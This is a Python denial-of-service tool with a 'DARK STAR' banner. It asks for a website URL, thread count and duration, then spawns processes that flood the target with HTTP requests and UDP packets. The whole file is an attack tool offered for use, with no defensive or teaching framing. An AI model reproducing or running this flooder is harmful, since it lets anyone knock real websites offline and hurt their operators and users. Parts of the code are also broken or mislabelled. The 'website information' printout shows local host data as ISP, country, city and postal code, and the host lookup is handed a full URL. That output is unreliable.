import httplib2
import socket
import multiprocessing
import time
import re
import dns.resolver
from urllib.parse import urlparse

def http_flood(target, num_requests):
    http = httplib2.Http()
    requests_left = num_requests
    while requests_left > 0:
        try:
            http.request(target)
        except Exception as e:
            print(f"HTTP request error: {e}")
        requests_left -= 1

def udp_flood(target_ip, num_requests):
    MAX_DGRAM = 1024
    ID = socketindir()  # Get a unique ID
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    try:
        for i in range(num_requests):
            d = (ID + i) % MAX_DGRAM
            sock.sendto(d.to_bytes(2, 'big'), (target_ip, 80))
    except KeyboardInterrupt:
        pass  # Handle Ctrl+C gracefully
    finally:
        sock.close()

def socketindir():
    # Creates a socket, collects its unique ID, then discards the socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('10.255.255.255', 1))
    IP = s.getsockname()[0]
    ID = int(IP.split('.')[-1])
    s.close()
    return ID

def start_attack(target, num_threads, attack_time):
    try:
        target_domain = get_domain_from_url(target)
        target_ip = resolve_domain_to_ip(target_domain)
    except Exception as e:
        print(f"Error resolving target IP: {e}")
        return

    processes = []

    for i in range(num_threads):
        http_process = multiprocessing.Process(target=http_flood, args=(target, 1000))
        udp_process = multiprocessing.Process(target=udp_flood, args=(target_ip, 1000))
        processes.append(http_process)
        processes.append(udp_process)

        http_process.start()
        udp_process.start()

    try:
        time.sleep(attack_time)
    except KeyboardInterrupt:
        print("\nCtrl+C detected. Stopping attack...")

    for process in processes:
        process.terminate()

def resolve_domain_to_ip(domain):
    try:
        result = dns.resolver.resolve(domain, 'A')
        return result[0].to_text()
    except dns.resolver.NXDOMAIN:
        raise ValueError(f"The domain '{domain}' does not exist.")
    except Exception as e:
        raise ValueError(f"Error resolving domain '{domain}': {e}")

def validate_url(url):
    # Simple regex to validate URL
    regex = re.compile(
        r'^(?:http|ftp)s?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # ...or ipv4
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'  # ...or ipv6
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

def get_domain_from_url(url):
    parsed_url = urlparse(url)
    return parsed_url.netloc

def get_valid_url_from_user():
    while True:
        target = input("\033[1;36m★ 𝚆𝚎𝚋𝚜𝚒𝚝𝚎 𝙻𝚒𝚗𝚔: \033[0m").strip()
        if validate_url(target):
            return target
        else:
            print("Invalid URL format. Please enter a valid URL.")

def get_valid_integer_input(prompt):
    while True:
        try:
            value = int(input(f"\033[1;33m★ {prompt}: \033[0m"))
            return value
        except ValueError:
            print("Invalid input. Please enter a valid integer.")

def display_ascii_art():
    # Add your ASCII art here
    ascii_art = """
    \033[1;36m
    

        ▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀     ██████ ▄▄▄█████▓ ▄▄▄       ██▀███  
        ▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒    ▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓██ ▒ ██▒
        ░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░    ░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▓██ ░▄█ ▒
        ░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄      ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▀▀█▄  
        ░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄   ▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░██▓ ▒██▒
         ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒   ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ▒▓ ░▒▓░
         ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░   ░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░▒ ░ ▒░
         ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░    ░  ░  ░    ░        ░   ▒     ░░   ░ 
           ░          ░  ░   ░     ░  ░            ░                 ░  ░   ░     
         ░                                                                        
                                                                    
– 𝙰𝚗𝚍 𝚝𝚘 𝙰𝚕𝚕𝚊𝚑 𝚋𝚎𝚕𝚘𝚗𝚐𝚜 𝚝𝚑𝚎 𝚔𝚒𝚗𝚐𝚍𝚘𝚖 𝚘𝚏 𝚝𝚑𝚎 𝚑𝚎𝚊𝚟𝚎𝚗𝚜 𝚊𝚗𝚍 𝚝𝚑𝚎 𝚎𝚊𝚛𝚝𝚑. 𝙰𝚗𝚍 𝙰𝚕𝚕𝚊𝚑 𝚑𝚊𝚜 𝚙𝚘𝚠𝚎𝚛 𝚘𝚟𝚎𝚛 𝚊𝚕𝚕 𝚝𝚑𝚒𝚗𝚐𝚜 –
                                ✷ 𝙰𝚕-𝚀𝚞𝚛𝚊𝚗: 3:189 ✷
                                
                                
                                
    \033[0m
    """
    print(ascii_art)

def main():
    display_ascii_art()
    target = get_valid_url_from_user()
    num_threads = get_valid_integer_input("𝚃𝚘𝚝𝚊𝚕 𝚃𝚑𝚛𝚎𝚊𝚍𝚜")
    attack_time = get_valid_integer_input("𝚃𝚘𝚝𝚊𝚕 𝚃𝚒𝚖𝚎 (𝙸𝚗 𝚂𝚎𝚌𝚘𝚗𝚍)")

    print("\n\033[1;36m█▓▒▒░░░𝓦𝓔𝓑𝓢𝓘𝓣𝓔 𝓘𝓝𝓕𝓞𝓡𝓜𝓐𝓣𝓘𝓞𝓝░░░▒▒▓█\033[0m\n")
    
    try:
        ip_address = socket.gethostbyname(target)
    except socket.gaierror as e:
        print(f"Error resolving target IP: {e}")
        return

    print("\033[1;33m𝙸𝙿 𝚊𝚍𝚍𝚛𝚎𝚜𝚜:\033[0m ", ip_address)
    print("\033[1;33m𝙷𝚘𝚜𝚝 𝚗𝚊𝚖𝚎:\033[0m ", socket.gethostname())
    print("\033[1;33m𝙸𝙿 𝚛𝚊𝚗𝚐𝚎:\033[0m ", socket.gethostbyname(socket.gethostname()))
    print("\033[1;33m𝙸𝚂𝙿:\033[0m ", socket.gethostbyname_ex(socket.gethostname())[2][0])
    print("\033[1;33m𝙾𝚛𝚐𝚊𝚗𝚒𝚣𝚊𝚝𝚒𝚘𝚗:\033[0m ", socket.gethostbyname_ex(socket.gethostname())[0])
    print("\033[1;33m𝙲𝚘𝚞𝚗𝚝𝚛𝚢:\033[0m ", socket.gethostbyname_ex(socket.gethostname())[1])
    print("\033[1;33m𝚁𝚎𝚐𝚒𝚘𝚗:\033[0m ", socket.gethostbyname_ex(socket.gethostname())[2])
    print("\033[1;33m𝙲𝚒𝚝𝚢:\033[0m ", socket.getfqdn(socket.gethostname()))
    print("\033[1;33m𝚃𝚒𝚖𝚎 𝚣𝚘𝚗𝚎:\033[0m ", time.ctime())
    print("\033[1;33m𝙻𝚘𝚌𝚊𝚕 𝚝𝚒𝚖𝚎:\033[0m ", time.strftime('%X %x %Z'))
    print("\033[1;33m𝙿𝚘𝚜𝚝𝚊𝚕 𝙲𝚘𝚍𝚎:\033[0m ", socket.gethostbyname(socket.getfqdn()))

    print("\n\033[1;36m★ 𝙿𝚛𝚎𝚜𝚜 𝙴𝚗𝚝𝚎𝚛 𝚃𝚘 𝚂𝚝𝚊𝚛𝚝 𝙰𝚝𝚝𝚊𝚌𝚔 ★\033[0m")
    input("Press Enter to start the attack...")

    print(f"\n\033[1;33m★ 𝚃𝚑𝚛𝚎𝚊𝚍𝚜 𝚂𝚎𝚗𝚝({num_threads}) ★\033[0m")

    start_attack(target, num_threads, attack_time)
    print("Attack completed.")

if __name__ == "__main__":
    main()
